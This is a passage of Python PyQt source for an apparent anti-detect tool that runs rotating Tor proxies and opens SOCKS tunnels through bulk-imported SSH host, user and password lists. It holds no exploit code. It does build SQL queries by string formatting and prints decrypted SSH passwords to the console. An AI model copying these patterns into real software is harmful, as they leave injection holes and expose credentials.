		super(MunProxiesMain, self).__init__();
		# variable
		self.mun_api = munantiapi.MunAntiApi()
		self.mainWindow = mainWindow
		self.ui = Ui_Munproxiesmain()
		self.ui.setupUi(self)
		self.list_browsers = {}		
  
		#proxies
		self.listProxiesChecked = []
		self.all_accounts = []
		labelsProxies = ['All']
		for c in range(self.ui.tableWidgetProxies.columnCount()):
			it = self.ui.tableWidgetProxies.horizontalHeaderItem(c)
			labelsProxies.append(str(c+1) if it is None else it.text())
		self.ui.tableWidgetProxies.setColumnCount(len(labelsProxies))
		self.headerProxies = CheckBoxHeader()
		self.ui.tableWidgetProxies.setHorizontalHeader(self.headerProxies)
		self.ui.tableWidgetProxies.setHorizontalHeaderLabels(
			labelsProxies)
		self.headerProxies.select_all_clicked.connect(
			self.headerProxies.change_state)
  


		self.ui.comboBoxProxyCountry.addItems(list(list_country.keys()))
		self.ui.pushButtonProxyCreate.clicked.connect(self.create_mun_proxy)
		self.ui.pushButtonSwitchIp.clicked.connect(self.switch_mun_proxies)
		self.ui.pushButtonProxiesRemove.clicked.connect(self.remove_mun_proxies)
		self.ui.pushButtonProxyStop.clicked.connect(self.stop_mun_proxies)
		self.ui.pushButtonProxiesStopAll.clicked.connect(self.stop_all_mun_proxies)
		self.ui.pushButtonProxiesFresh.clicked.connect(self.get_mun_proxies)
		self.mun_proxy_details = {}
		self.totalMunProxiesQueue = 0
		self.munProxiesQueque = queue.Queue()
		self.statusqueue = queue.Queue()
		self.get_mun_proxies()
		self.statustheard = False
		if not self.statustheard:
			self.statustheard = Update_status_worker(self,self.statusqueue)
			self.statustheard.trigger.connect(self.update_status)
			self.statustheard.start() 
		self.show();
  
	@pyqtSlot(int)
	def proxies_state_changed(self, checked, row, row_db):
		if checked:
			if row_db not in self.listProxiesChecked:
				self.listProxiesChecked.append(row_db)
		else:
			if row_db in self.listProxiesChecked:
				self.listProxiesChecked.remove(row_db)
 

    
	def get_mun_proxy_details(self):
		print('==get proxy details==')

		# comboBoxProxyType = self.ui.comboBoxProxyType.currentText()
		comboBoxProxyCountry = self.ui.comboBoxProxyCountry.currentText()
		comboBoxProxyTime = self.ui.comboBoxProxyTime.currentText()
		comboBoxProxyPort = self.ui.comboBoxProxyPort.currentText()
		lineEditProxyBridges = self.ui.lineEditProxyBridges.text()
		# self.mun_proxy_details['proxy_type'] = comboBoxProxyType

		self.mun_proxy_details['proxy_country'] = comboBoxProxyCountry
		self.mun_proxy_details['proxy_bridges'] = lineEditProxyBridges
		self.mun_proxy_details['proxy_time'] = comboBoxProxyTime
		self.mun_proxy_details['proxy_port'] = comboBoxProxyPort
  
		return self.mun_proxy_details
  
	def create_mun_proxy(self):
		print('==create mun proxy==')
		proxy_details = self.get_mun_proxy_details()
		if self.totalMunProxiesQueue < 5:
			self.MunProxiesThread = MunProxiesThread(
				self.munProxiesQueque, self.statusqueue)
			self.MunProxiesThread.start()
			self.totalMunProxiesQueue += 1
		data_put = {}
		data_put['action'] = 'create_mun_proxies'
		data_put['data'] = proxy_details
		self.munProxiesQueque.put(data_put)  


	def get_mun_proxies(self):
		print('==get_mun_proxies==')
		if self.totalMunProxiesQueue < 5:
			self.MunProxiesThread = MunProxiesThread(
				self.munProxiesQueque, self.statusqueue)
			self.MunProxiesThread.start()
			self.totalMunProxiesQueue += 1
		data_put = {}
		data_put['action'] = 'get_mun_proxies'
		
		self.munProxiesQueque.put(data_put)  

	def remove_mun_proxies(self):
		if len(self.listProxiesChecked) > 0:
			qm = QtWidgets.QMessageBox
			ret = qm.question(self,'', "Are you sure to remove the selected proxies?", qm.Yes | qm.No)
			if ret == qm.Yes:
				data_put = {}
				data_put['action'] = 'remove_mun_proxies'
				data_put['data'] = self.listProxiesChecked
				self.munProxiesQueque.put(data_put)  
		else:
			QtWidgets.QMessageBox.about(self, "Error", "Please select the profiles")



	def switch_mun_proxies(self):
		print('==switch_mun_proxies==')
		print(self.listProxiesChecked)
		for line_proxy in self.listProxiesChecked:
			self.mun_proxy = munproxy.MunProxy()
			self.mun_proxy.switch_tor_ip(port=line_proxy['control_port'])
		QtWidgets.QMessageBox.about(
				self, "Success", "Your proxies switched!")

	def stop_mun_proxies(self):
		print('==stop_mun_proxies==')
		list_remove = []
		for line_tor in list_tor_process:
			SOCKS_PORT, CONTROL_PORT, tor_process = line_tor
			for line_proxy in self.listProxiesChecked:
				if SOCKS_PORT == line_proxy['socks_port']:
					tor_process.kill()
					list_remove.append(line_tor)
		for line_remove in list_remove:
			list_tor_process.remove(line_remove)
		QtWidgets.QMessageBox.about(
				self, "Success", "Your proxies stopped!")
  
	def stop_all_mun_proxies(self):
		print('==stop_mun_proxies==')
		list_remove = []
		for line_tor in list_tor_process:
			SOCKS_PORT, CONTROL_PORT, tor_process = line_tor
			tor_process.kill()
			list_remove.append(line_tor)
		for line_remove in list_remove:
			list_tor_process.remove(line_remove)
		QtWidgets.QMessageBox.about(
				self, "Success", "All your proxies stopped!")
  
	def handleButtonProxiesOpenClicked(self,row_db, buttonOpen):
		textbuttonOpen = buttonOpen.text()
		print('Open==',textbuttonOpen)
		if textbuttonOpen == 'Start':
			buttonOpen.setText('Stop')
			buttonOpen.setStyleSheet("background-color : red")
			if self.totalMunProxiesQueue < 5:
				self.MunProxiesThread = MunProxiesThread(
					self.munProxiesQueque, self.statusqueue)
				self.MunProxiesThread.start()
				self.totalMunProxiesQueue += 1
			data_put = {}
			data_put['action'] = 'start_proxies'
			data_put['data'] = row_db
			self.munProxiesQueque.put(data_put)
		else:
			buttonOpen.setText('Start')
			buttonOpen.setStyleSheet("background-color : #5d7f32")
			list_remove = []
			for line_tor in list_tor_process:
				SOCKS_PORT, CONTROL_PORT, tor_process = line_tor
				if SOCKS_PORT == row_db['socks_port']:
					tor_process.kill()
					list_remove.append(line_tor)
			for line_remove in list_remove:
				list_tor_process.remove(line_remove)


	def create_button_proxies(self, row_db):
		profile_opened = False
		for line_process in list_tor_process:
			SOCKS_PORT, CONTROL_PORT, tor_process = line_process
			if str(row_db['socks_port']) == str(SOCKS_PORT):
				profile_opened = True
		if profile_opened:
			self.buttonOpen = QtWidgets.QPushButton('Stop', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonProxiesOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : red")
		else:
			self.buttonOpen = QtWidgets.QPushButton('Start', self)
			self.buttonOpen.clicked.connect(
				partial(self.handleButtonProxiesOpenClicked, row_db, self.buttonOpen))
			self.buttonOpen.setStyleSheet("background-color : #5d7f32")
		return self.buttonOpen 



	def showRowsMunProxies(self, rows):
		print('==showRowsMunProxies==')
		self.headerProxies.all_header_combobox = []
		self.refesh_table = True
		self.ui.tableWidgetProxies.setRowCount(0)
		self.all_profiles = rows
		for row_db in self.all_profiles:
			self.buttonOpen = self.create_button_proxies(row_db)

			checkbox = QCheckBox()
			if checkbox not in self.headerProxies.all_header_combobox:
				self.headerProxies.all_header_combobox.append(checkbox)
			row = self.ui.tableWidgetProxies.rowCount()
			checkbox.stateChanged.connect(
				lambda checked, row=row, row_db=row_db: self.proxies_state_changed(checked, row, row_db))

			layout = QtWidgets.QHBoxLayout()
			layout.setContentsMargins(0,0,0,0)
			layout.setSpacing(0)
			layout.addWidget(checkbox)
			layout.addWidget(self.buttonOpen)
			cellWidget = QtWidgets.QWidget()
			cellWidget.setLayout(layout)
			self.ui.tableWidgetProxies.insertRow(row)
			self.ui.tableWidgetProxies.setCellWidget(row, 0, cellWidget)
			self.ui.tableWidgetProxies.setItem(row, 1, QtWidgets.QTableWidgetItem(str(row_db["id"])))
			self.ui.tableWidgetProxies.setItem(row, 2, QtWidgets.QTableWidgetItem(str(row_db["socks_port"])))
			self.ui.tableWidgetProxies.setItem(row, 3, QtWidgets.QTableWidgetItem(str(row_db["control_port"])))
			self.ui.tableWidgetProxies.setItem(row, 4, QtWidgets.QTableWidgetItem(str(row_db["rotating_time"])))
			self.ui.tableWidgetProxies.setItem(row, 5, QtWidgets.QTableWidgetItem(str(row_db["country_code"])))
			self.ui.tableWidgetProxies.setItem(row, 6, QtWidgets.QTableWidgetItem(str(row_db["country_name"])))
			self.ui.tableWidgetProxies.setItem(row, 7, QtWidgets.QTableWidgetItem(str(row_db["bridges_string"])))
			# self.ui.tableWidgetProfiles.setCellWidget(row,10, self.buttonOpen) 
		self.refesh_table = False

	def update_status(self, tag, data):

		if tag == 'remove_mun_proxies':
			self.get_mun_proxies()
			QtWidgets.QMessageBox.about(
				self, "Success", "Your selected accounts already updated!")
			self.listAccountsChecked = []	
		if tag == 'get_mun_proxies':
			self.showRowsMunProxies(json.loads(data))
		if tag == 'create_mun_proxies':
			self.get_mun_proxies()
			data_json = json.loads(data)
			QtWidgets.QMessageBox.about(
				self, "Success", "Your proxies started with port:%s and control port:%s" % ( str(data_json['SOCKS_PORT']),  str(data_json['CONTROL_PORT'])) )   
		if tag == 'start_proxies':
			# self.get_mun_proxies()
			data_json = json.loads(data)
			QtWidgets.QMessageBox.about(
				self, "Success", "Your proxies started with port:%s and control port:%s" % ( str(data_json['SOCKS_PORT']),  str(data_json['CONTROL_PORT'])) )     
		if tag == 'error':
			QtWidgets.QMessageBox.about(
				self, "Error", data) 

class Update_status_worker(QtCore.QThread):
	trigger = pyqtSignal(str, str)

	def __init__(self,main, statusqueue):
		QtCore.QThread.__init__(self)
		self.statusqueue = statusqueue
		self.main = main
  
	def get_driver_status(self, browser_pid):
		try:
			result = psutil.pid_exists(browser_pid)
			return result
		except:
			return

	def run(self):
		while 1:
			try:
				# list_remove = []
				# for key, value in self.main.list_browsers.items():
				# 	result_pid = self.get_driver_status(value)
				# 	if not result_pid:
				# 		print('==remove==', key)
				# 		list_remove.append(key)
				# 		self.main.show_all_profiles()
				# 		self.main.show_all_accounts()
				# for line in list_remove:
				# 	del self.main.list_browsers[line]
				tag, status_recive = self.statusqueue.get()
				self.trigger.emit(tag, status_recive)
			except Exception as e:
				print('====error====', e)
			time.sleep(0.1)

class SSHThread(QtCore.QThread):
	trigger = pyqtSignal(str, str)
	def __init__(self, name_theard='', ip='', username='', password='', local_port='', check='', port=22,
				 sshtablewidget='', row=''):
		# super(SSHThread,self).__init__(name_theard)
		QtCore.QThread.__init__(self)
		self.name_theard = str(name_theard)
		self.ip = ip
		self.username = username
		self.password = password
		self.local_port = local_port
		self.check = check
		self.port = port
		self.sshtablewidget = sshtablewidget
		self.row = row

	def run(self):
		print('===Opening===')
		self.update_ssh_status('Opening')

		sshmanager = sshsocks_manager.SshSockManager()
		sshopen_socks = sshmanager.start(self.ip, self.username, self.password,
										 local_port=self.local_port)
		if sshopen_socks.find('check die:') == -1:
			self.update_ssh_status('Running')
			self.update_port_status(str(self.local_port))
			self.name_theard += '|Running'
		else:

			self.update_port_status(sshopen_socks.split('check die:')[1])
			self.name_theard += '|Error'
			try:
				global local_port_list
				local_port_list.remove(int(self.local_port))
			except:
				pass

	def update_port_status(self, status):

		self.sshtablewidget.setItem(self.row, 5, QtWidgets.QTableWidgetItem(status))


	def update_ssh_status(self, status):

		self.sshtablewidget.setItem(self.row, 6, QtWidgets.QTableWidgetItem(status))

class SSH(QtWidgets.QWidget):
	def __init__(self, mainWindow):
		super(SSH, self).__init__();
		self.mainWindow = mainWindow;
		# uic.loadUi('ui/ssh.ui', self)
		# self.Ui_sshForm = Ui_sshForm()
		# self.Ui_sshForm.setupUi(self)
		# uic.loadUi(appFolderPath+'/ui/ssh.ui',self);
		# connect
		self.sshUI = Ui_sshForm()
		self.sshUI.setupUi(self)
		self.sshUI.cbselectssh.activated.connect(self.show_ssh_combox_list)
		self.sshUI.btnsshsetup.clicked.connect(self.ssh_setup)
		self.sshUI.btnstopallssh.clicked.connect(self.stopallssh)
		self.sshUI.btnfind.clicked.connect(self.find)
		self.sshUI.btreload.clicked.connect(self.show_ssh_combox_list)
		self.sshUI.btnsavessh.clicked.connect(self.save_ssh)
		# self.Ui_sshForm.sshtableWidget.cellDoubleClicked.connect(self.run_ssh_auto_port)
		# setup table
		self.sshUI.sshtableWidget.verticalHeader().setVisible(False)
		self.sshUI.sshtableWidget.setSortingEnabled(True)
		self.sshUI.sshtableWidget.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
		# show
		self.createActions()
		self.show();
		# variable

		##ssh setup
		if not os.path.isdir('ssh/'):
			os.makedirs('ssh/')
		listdircatalog = os.listdir('ssh/')
		added = 0
		i = 0
		while i < len(listdircatalog):
			linecatalog = listdircatalog[i]
			if not os.path.isdir('ssh/' + linecatalog) and linecatalog.find('.db') != -1:
				added += 1
				# if added == 1:
				# self.Ui_sshForm.cbselectssh.setItemText(0,QtCore.QString(linecatalog))
				# else:
				#	print i
				self.sshUI.cbselectssh.addItem(linecatalog)
			i += 1
		# menu
		self.menu = QtWidgets.QMenu(self)
		global local_port_list
		local_port_list = []

	# load ssh list
	# self.show_ssh_combox_list()
	# self.connect( sshtheard, QtCore.SIGNAL("update(QString,QString)"), self.threadUpdate );
	def save_ssh(self):
		cbcatalog_text = self.sshUI.cbselectssh.currentText()
		if cbcatalog_text.find('.db') != -1:
			self.save_to_database(database=cbcatalog_text)

	def save_to_database(self, database=''):
		rows = self.sshUI.sshtableWidget.rowCount()
		con = lite.connect('ssh/' + database)
		if rows:
			with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				r = 0
				while r < rows:
					id = self.sshUI.sshtableWidget.item(r, 0).text()
					city = self.sshUI.sshtableWidget.item(r, 2).text()
					state = self.sshUI.sshtableWidget.item(r, 3).text()
					country = self.sshUI.sshtableWidget.item(r, 4).text()
					ssh_note = self.sshUI.sshtableWidget.item(r, 7).text()
					ssh_blacklist = self.sshUI.sshtableWidget.item(r, 8).text()
					cur.execute("""
					   UPDATE ssh_info
					   SET id='%s', city='%s', state='%s', country='%s', ssh_note='%s', ssh_blacklist='%s'
					   WHERE id ='%s'
					""" % (id, city, state, country, ssh_note, ssh_blacklist, id))
					r += 1
				con.commit()
		con.close()
		QtGui.QMessageBox.about(self, "Save info SSH status", "Saved")

	def stopallssh(self):
		socks.setdefaultproxy()
		socket.socket = socks.socksocket
		for p in multiprocessing.active_children():
			if p.name.find('ssh') != -1:
				p.terminate();
				p.join();
				print('Stoped All SSH')
		rows = self.sshUI.sshtableWidget.rowCount()
		row = 0
		while row < rows:
			port = None
			try:
				port = self.sshUI.sshtableWidget.item(row, 6).text()
			except:
				pass
			if port:
				self.sshUI.sshtableWidget.setItem(row, 5, QtWidgets.QTableWidgetItem(''))
				self.sshUI.sshtableWidget.setItem(row, 6, QtWidgets.QTableWidgetItem('Stoped'))
			row += 1
		global local_port_list
		local_port_list = []

	def find(self):
		self.sshUI.sshtableWidget.setRowCount(0)

		findText = self.sshUI.cbfind.currentText()

		if findText:
			cbcatalog_text = self.sshUI.cbselectssh.currentText()
			con = lite.connect('ssh/' + cbcatalog_text)
			with con:

				con.row_factory = lite.Row
				cur = con.cursor()
				cur.execute("SELECT * FROM ssh_info")
				rows = cur.fetchall()

				listfond = []
				for row_db in rows:
					city = str(row_db["city"])
					state = str(row_db["state"])
					country = str(row_db["country"])
					ip = str(row_db["ip"])
					username = str(row_db["username"])
					password = str(row_db["password"])
					ip_infodecrypt = str(ip)
					username_infodecrypt = aes_cipher.decrypt(str(username))
					password_infodecrypt = aes_cipher.decrypt(str(password))
					if re.search(findText, ip_infodecrypt, re.IGNORECASE) or re.search(findText, username_infodecrypt,
																					   re.IGNORECASE) or re.search(
						findText, password_infodecrypt, re.IGNORECASE) or re.search(findText, city,
																					re.IGNORECASE) or re.search(
						findText, state, re.IGNORECASE) or re.search(findText, country, re.IGNORECASE):
						listfond.append(row_db)
				if listfond:
					self.showrows(listfond)
			con.close()

	def showrows(self, rows):
		self.sshUI.sshtableWidget.setRowCount(0)
		for row_db in rows:
			row = self.sshUI.sshtableWidget.rowCount()
			self.sshUI.sshtableWidget.insertRow(row)
			ip = str(row_db["ip"])
			ip_infodecrypt = str(ip)
			self.sshUI.sshtableWidget.setItem(row, 0, QtWidgets.QTableWidgetItem(str(row_db["id"])))
			self.sshUI.sshtableWidget.setItem(row, 1, QtWidgets.QTableWidgetItem(ip_infodecrypt))
			self.sshUI.sshtableWidget.setItem(row, 2, QtWidgets.QTableWidgetItem(row_db["city"]))
			self.sshUI.sshtableWidget.setItem(row, 3, QtWidgets.QTableWidgetItem(row_db["state"]))
			self.sshUI.sshtableWidget.setItem(row, 4, QtWidgets.QTableWidgetItem(row_db["country"]))
			self.sshUI.sshtableWidget.setItem(row, 7, QtWidgets.QTableWidgetItem(row_db["ssh_note"]))
			self.sshUI.sshtableWidget.setItem(row, 8, QtWidgets.QTableWidgetItem(row_db["ssh_blacklist"]))
			# self.Ui_sshForm.sshtableWidget.setItem(row, 9, QtGui.QTableWidgetItem(row_db["ssh_false"]))

	def contextMenuEvent(self, event):
		self.menu.exec_(event.globalPos())

	def createActions(self):
		## cc action
		self.run_ssh_auto_port = QtWidgets.QAction("&Run SSH With Auto Port", self,
											   shortcut="",
											   statusTip="Run SSH For Auto Port", triggered=self.run_ssh_auto_port)

		self.runselectsshmanual = QtWidgets.QAction("&Run SSH With Manual Port", self,
												shortcut="",
												statusTip="Run SSH With Manual Port",
												triggered=self.run_ssh_manual_port)
		self.stopselectssh = QtWidgets.QAction("&Stop Selected Shh", self,
										   shortcut="",
										   statusTip="Stop Selected Shh", triggered=self.stopselectrowssh)

		self.rmselectssh = QtWidgets.QAction("&Remove Selected Row", self,
										 shortcut="",
										 statusTip="Remove Selected Row", triggered=self.removeselectrowssh)

	def run_ssh_manual_port(self):
		rows = self.sshUI.sshtableWidget.selectionModel().selectedRows()
		if len(rows) > 1:
			return
		item, ok = QtWidgets.QInputDialog.getItem(self, "Set Manually Port", "Input Port:", '', 0, True);
		if str(item).isdigit() and ok:
			local_port = int(item)
			if local_port not in local_port_list:
				local_port_list.append(local_port)
				check = self.check_local_port(local_port)
				if check:
					for r in rows:
						row = r.row()
						self.run_ssh(row, local_port)
				else:
					QtGui.QMessageBox.about(self, "Open ssh status", 'Your port:' + str(local_port) + ' already used')
			else:
				QtGui.QMessageBox.about(self, "Open ssh status", 'Your port:' + str(local_port) + ' already used')

	def run_ssh(self, row, local_port):
		# global orderfuntion
		# if not orderfuntion:
		# QtGui.QMessageBox.about(self, "Contact Admin For Hwid")
		# return

		id = self.sshUI.sshtableWidget.item(row, 0).text()
		cbcatalog_text = str(self.sshUI.cbselectssh.currentText())
		if cbcatalog_text.find('.db') != -1:
			con_bill = lite.connect('ssh/' + cbcatalog_text)
			with con_bill:
				con_bill.row_factory = lite.Row
				cur = con_bill.cursor()
				cur.execute("SELECT * from ssh_info WHERE id='%s'" % (id))
				rows = cur.fetchone()
				ip = rows[1]
				username = aes_cipher.decrypt(rows[2])
				password = aes_cipher.decrypt(rows[3])
				print('==run ssh==',ip,username,password)
				self.sshtheard = SSHThread(name_theard=local_port, ip=ip, local_port=local_port, username=username,
									  password=password, sshtablewidget=self.sshUI.sshtableWidget, row=row)
				self.sshtheard.trigger.connect(self.update_status)
				self.sshtheard.start()

	def run_ssh_auto_port(self):
		## run order theard
		rows = self.sshUI.sshtableWidget.selectionModel().selectedRows()
		for r in rows:
			row = r.row()
			i = 1080
			local_port = None
			while i < 1181:
				local_port = i
				if local_port not in local_port_list:
					check = self.check_local_port(local_port)
					if check:
						local_port_list.append(local_port)
						break
				i += 1
			print(row,local_port)
			self.run_ssh(row, local_port)

	def check_local_port(self, port):
		try:
			s = socket.socket()
			s.bind(('127.0.0.1', port))
			s.close()
		except Exception as e:
			print('======error=======',e)
		else:
			return True

	def stopselectrowssh(self):
		rows = self.sshUI.sshtableWidget.selectionModel().selectedRows()
		for r in rows:
			row = r.row()
			port = self.sshUI.sshtableWidget.item(row, 5).text()
			# wait and terminate all child process
			for p in multiprocessing.active_children():
				# print p.name
				# print ip+port
				if p.name.find('ssh:127.0.0.1:' + port) != -1:
					p.terminate();
					p.join();
					self.sshUI.sshtableWidget.setItem(row, 5, QtWidgets.QTableWidgetItem(''))
					self.sshUI.sshtableWidget.setItem(row, 6, QtWidgets.QTableWidgetItem('Stoped'))
					local_port_list.remove(int(port))
					print ('stoped: ' + 'ssh:127.0.0.1:' + port)

	def removeselectrowssh(self):
		rows = self.sshUI.sshtableWidget.selectionModel().selectedRows()
		self.removerow(rows)

	def removerow(self, rows):
		cbcatalog_text = str(self.sshUI.cbselectssh.currentText())

		con = lite.connect('ssh/' + cbcatalog_text)
		with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			i = 0
			while i < len(rows):
				r = rows[i].row()
				info_id = self.sshUI.sshtableWidget.item(r, 0).text()
				cur.execute("DELETE FROM ssh_info WHERE id=%s" % (str(info_id)))
				i += 1
			con.commit()
			cur.execute("SELECT * FROM ssh_info")
			rows = cur.fetchall()
			self.show_ssh_combox_list()
		con.close()

	def ssh_setup(self):
		uisshDialog = SSHsetup(self)
		uisshDialog.show()

	def show_ssh_combox_list(self):
		self.sshUI.sshtableWidget.setRowCount(0)
		cbcatalog_text = self.sshUI.cbselectssh.currentText()
		if cbcatalog_text.find('.db') != -1:
			con_bill = lite.connect('ssh/' + cbcatalog_text)
			with con_bill:
				con_bill.row_factory = lite.Row
				cur = con_bill.cursor()
				cur.execute("SELECT * FROM ssh_info")
				rows = cur.fetchall()
				list_row_show = []
				list_row_using = []
				for row in rows:
					# print row
					self.add_row_to_ssh_table(row)
			con_bill.close()
		self.menu.clear()
		self.menu.addAction(self.run_ssh_auto_port)
		self.menu.addAction(self.runselectsshmanual)
		self.menu.addAction(self.stopselectssh)
		self.menu.addAction(self.rmselectssh)

	def add_row_to_ssh_table(self, line_row):
		row = self.sshUI.sshtableWidget.rowCount()
		self.sshUI.sshtableWidget.insertRow(row)
		# print list_rows[0]
		ip_infodecrypt = str(line_row['ip'])
		# username_infodecrypt = aes_cipher.decrypt(str(line_row[2]))
		# password_infodecrypt = aes_cipher.decrypt(str(line_row[3]))
		if str(line_row["ssh_note"]).strip() == 'None':
			ssh_note = ''
		else:
			ssh_note = str(line_row["ssh_note"]).strip()
		# if str(line_row["ssh_false"]).strip() == 'None':
		#     ssh_false = ''
		# else:
		#     ssh_false = str(line_row["ssh_false"]).strip()
		if str(line_row["ssh_blacklist"]).strip() == 'None':
			ssh_blacklist = ''
		else:
			ssh_blacklist = str(line_row["ssh_blacklist"]).strip()
		self.sshUI.sshtableWidget.setItem(row, 0, QtWidgets.QTableWidgetItem(str(line_row["id"]).strip()))
		self.sshUI.sshtableWidget.setItem(row, 1, QtWidgets.QTableWidgetItem(ip_infodecrypt.strip()))
		self.sshUI.sshtableWidget.setItem(row, 2, QtWidgets.QTableWidgetItem(str(line_row["city"]).strip()))
		self.sshUI.sshtableWidget.setItem(row, 3, QtWidgets.QTableWidgetItem(str(line_row["state"]).strip()))
		self.sshUI.sshtableWidget.setItem(row, 4, QtWidgets.QTableWidgetItem(str(line_row["country"]).strip()))
		##
		self.sshUI.sshtableWidget.setItem(row, 7, QtWidgets.QTableWidgetItem(ssh_note))
		self.sshUI.sshtableWidget.setItem(row, 8, QtWidgets.QTableWidgetItem(ssh_blacklist))
		# self.Ui_sshForm.sshtableWidget.setItem(row, 9, QtGui.QTableWidgetItem(ssh_false))

	def update_status(self, tag, data):
		if tag == 'check_done':
			if data.find('check die') == -1:
				self.sshUI.validTextEdit.setPlainText(self.validTextEdit.toPlainText() + '\n' + data)
				if self.save_file:
					self.save_file.write(data + '\n')
					self.save_file.flush()
		elif tag == 'update_status':
			# data = unicode(data).encode('utf-8')
			self.sshUI.statusLabel.setText(data)
		elif tag == 'uncheck':
			self.sshUI.dontsupporttextEdit.setPlainText(self.dontsupporttextEdit.toPlainText() + '\n' + data);
		elif tag == 'het_socks':
			self.sshUI.socksTextEdit.setPlainText('')

#############################billing and shipping manager
class SSHsetup(QtWidgets.QDialog):
	def __init__(self, parent=None):
		QtWidgets.QDialog.__init__(self, parent)
		self.main = parent
		
		# uic.loadUi('ui/sshsetup.ui', self)
		self.Ui_Dialogssh = Ui_Dialogssh()
		self.Ui_Dialogssh.setupUi(self)
		self.Ui_Dialogssh.btnokssh.clicked.connect(self.add_ssh)
		self.Ui_Dialogssh.btncancelssh.clicked.connect(self.cancel)

		if not os.path.isdir('ssh/'):
			os.makedirs('ssh/')

		listdircatalog = os.listdir('ssh/')
		for linecatalog in listdircatalog:
			if not os.path.isdir('shipping/' + linecatalog) and linecatalog.find('.db') != -1:
				self.Ui_Dialogssh.cbsshdatabase.addItem(linecatalog)

	def cancel(self):
		self.close()

	def add_ssh(self):
		ssh_plain_text = self.Ui_Dialogssh.plainTextEditssh.toPlainText()
		comboBoxcatalogue = self.Ui_Dialogssh.cbsshdatabase.currentText()

		if ssh_plain_text.find('|') != -1 and comboBoxcatalogue.find('.db') != -1:
			ssh_plain_text = ssh_plain_text.strip().replace('\r', '\n')
			adddb = None
			add_total = 0
			if ssh_plain_text.find('\n') != -1:
				list_ssh_plain_text = ssh_plain_text.split('\n')
				for line_ssh_plain_text in list_ssh_plain_text:
					if line_ssh_plain_text.find('|') != -1:
						list_ssh_split = line_ssh_plain_text.split('|')
						try:
							ip = list_ssh_split[0].strip()
							username = list_ssh_split[1].strip()
							password = list_ssh_split[2].strip()
							city, state, country = self.get_ip_infomation(ip)
							adddb = self.add_ssh_to_db(ip, username, password, city, state, country, comboBoxcatalogue)
							if adddb:
								add_total += 1
						except:
							self.Ui_Dialogssh.plainTextEditsshfailed.setPlainText(
								self.Ui_Dialogssh.plainTextEditsshfailed.toPlainText() + '\n' +
									line_ssh_plain_text + '\n')

			else:
				if ssh_plain_text.find('|') != -1:
					list_ssh_split = ssh_plain_text.split('|')

					ip = list_ssh_split[0].strip()
					username = list_ssh_split[1].strip()
					password = list_ssh_split[2].strip()
					city, state, country = self.get_ip_infomation(ip)
					adddb = self.add_ssh_to_db(ip, username, password, city, state, country, comboBoxcatalogue)
					if adddb:
						add_total += 1

						# self.Ui_Dialogssh.plainTextEditsshfailed.setPlainText(self.Ui_Dialogssh.plainTextEditsshfailed.toPlainText()+'\n'+QtCore.QString(ssh_plain_text+'\n'))
			if add_total:
				QtWidgets.QMessageBox.about(self, "Add ssh status", "Added ssh " + str(add_total) + " Success")
				return
			else:
				QtWidgets.QMessageBox.about(self, "Add ssh status", "Error Please Check Your ssh infomation")
				return

	def get_ip_infomation(self, ip):

		try:
			reader = geoip2.database.Reader('ssh/GeoLite2-City.mmdb')
			response = reader.city(ip)
			city = response.city.name
			state = response.subdivisions.most_specific.iso_code
			country = response.country.iso_code
			reader.close()
		except:
			city ='None'
			state ='None'
			country ='None'

		return city, state, country

	def add_ssh_to_db(self, ip, username, password, city, state, country, comboBoxcatalogue):

		ip_add_encrypt = ip
		username_add_encrypt = aes_cipher.encrypt(username)
		password_add_encrypt = aes_cipher.encrypt(password)
		con_ship = lite.connect('ssh/' + comboBoxcatalogue)
		with con_ship:
			con_ship.row_factory = lite.Row
			cur = con_ship.cursor()
			try:
				cur.execute("SELECT * FROM ssh_info")
			except:
				cur.execute('''CREATE TABLE ssh_info
					   (id INT PRIMARY KEY      NOT NULL,
					   ip       CHAR(255) NOT NULL,
					   username      CHAR(255) NOT NULL,
					   password      CHAR(255) NOT NULL,
					   city     CHAR(255),
					   state     CHAR(255),
					   country     CHAR(255),
					   ssh_note     CHAR(255),
					   ssh_blacklist   CHAR(255));''')
				cur.execute("SELECT * FROM ssh_info")

				self.main.sshUI.cbsshdatabase.addItem(QtCore.QString(comboBoxcatalogue))
			rows = cur.fetchall()

			if not rows:
				idssh = 1
			else:
				lastrow = rows[len(rows) - 1]
				list_id_db = int(lastrow['id'])
				idssh = list_id_db + 1

			try:
				city = str(city).encode('utf8', 'ignore').encode("ascii", "ignore")
			except:
				try:
					city = str(city).decode('utf8', 'ignore').encode("ascii", "ignore")
				except:
					city = 'None'
			try:
				state = str(state).encode('utf8', 'ignore').encode("ascii", "ignore")
			except:
				try:
					state = str(state).decode('utf8', 'ignore').encode("ascii", "ignore")
				except:
					state = 'None'

			cur.execute("INSERT INTO ssh_info (id,ip,username,password,city,state,country,ssh_note,ssh_blacklist) \
									VALUES (%d, '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s' )" % (
				int(idssh), str(ip_add_encrypt), str(username_add_encrypt), str(password_add_encrypt),
				str(city).replace("'", ''), str(state).replace("'", ''), str(country).replace("'", ''), '', ''));
			return True

		# QtGui.QMessageBox.about(self, "Add shipping status", "Added shipping Success")
		con_ship.close()

class Login(QtWidgets.QDialog):
	def __init__(self, parent=None):
		super(Login, self).__init__(parent)
		self.setWindowTitle('Authentication')
		self.usernameLabel = QtWidgets.QLabel('Username',self)
		self.textName = QtWidgets.QLineEdit(self)
		self.passwordLabel = QtWidgets.QLabel('Password',self)
		self.textPass = QtWidgets.QLineEdit(self)
		self.textPass.setEchoMode(QtWidgets.QLineEdit.Password)
		self.buttonLogin = QtWidgets.QPushButton('Login', self)
		self.buttonLogin.clicked.connect(self.handleLogin)
		layout = QtWidgets.QVBoxLayout(self)
		layout.addWidget(self.usernameLabel)
		layout.addWidget(self.textName)
		layout.addWidget(self.passwordLabel)
		layout.addWidget(self.textPass)
		layout.addWidget(self.buttonLogin)
		self.mun_api = munantiapi.MunAntiApi()
	def handleLogin(self):
		username = self.textName.text()
		password = self.textPass.text()
		result = self.mun_api.site_login(username,password)
		if result:
			self.accept()	
		else:
			QtWidgets.QMessageBox.warning(
				self, 'Error', 'Your username or password incorect!')


def clear_process():
	print('kill process')
	for p in multiprocessing.active_children():
		print('===name===',p.name)
		p.terminate()
		p.join()
	processing_pid_path = os.path.join(appFolderPath, 'processing_pid.txt')
	if os.path.exists(processing_pid_path):
